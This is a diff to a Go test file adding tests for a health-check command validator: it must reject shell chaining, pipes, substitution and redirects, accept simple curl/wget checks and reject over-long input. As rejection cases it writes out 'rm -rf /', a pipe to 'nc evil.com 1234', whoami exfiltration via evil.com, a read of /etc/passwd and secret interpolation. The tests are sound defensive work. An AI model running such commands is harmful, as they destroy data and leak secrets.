@@ -4,6 +4,7 @@
 package grpc
 
 import (
+	"strings"
 	"testing"
 )
 
@@ -203,6 +204,57 @@ func TestTaskRouterNotifierUnknown(t *testing.T) {
 	// Should not panic for unknown task/thrall.
 	router.notifyCompletion("run-1", "thrall-a")
 	router.removeNotifier("run-1", "thrall-a")
+}
+
+func TestValidateHealthCheck_RejectsShellChaining(t *testing.T) {
+	cases := []struct {
+		name string
+		cmd  string
+	}{
+		{"semicolon", "curl http://health; rm -rf /"},
+		{"and_chain", "curl http://health && echo pwned"},
+		{"or_chain", "curl http://health || echo fallback"},
+		{"pipe", "curl http://health | nc evil.com 1234"},
+		{"backtick", "curl `whoami`.evil.com"},
+		{"command_sub", "curl $(whoami).evil.com"},
+		{"redirect_out", "curl http://health > /dev/null"},
+		{"redirect_in", "curl http://health < /etc/passwd"},
+		{"newline", "curl http://health\nrm -rf /"},
+		{"dollar_brace", "curl http://health/${SECRET}"},
+		{"dollar_var", "curl http://health/$HOME"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateHealthCheck(tc.cmd)
+			if err == nil {
+				t.Fatalf("expected rejection for command with %s", tc.name)
+			}
+		})
+	}
+}
+
+func TestValidateHealthCheck_AcceptsSimpleCommands(t *testing.T) {
+	cases := []string{
+		"curl -sf http://localhost:8080/healthz",
+		"/usr/bin/health-check --timeout 5",
+		"wget -q -O /dev/null http://127.0.0.1:9090/ready",
+	}
+	for _, cmd := range cases {
+		if err := validateHealthCheck(cmd); err != nil {
+			t.Fatalf("simple command %q should be accepted: %v", cmd, err)
+		}
+	}
+}
+
+func TestValidateHealthCheck_RejectsTooLong(t *testing.T) {
+	long := strings.Repeat("a", 513)
+	err := validateHealthCheck(long)
+	if err == nil {
+		t.Fatal("expected rejection for command > 512 chars")
+	}
+	if !strings.Contains(err.Error(), "too long") {
+		t.Fatalf("unexpected error: %v", err)
+	}
 }
 
 // makeTargets creates a slice of targetInfo for testing.
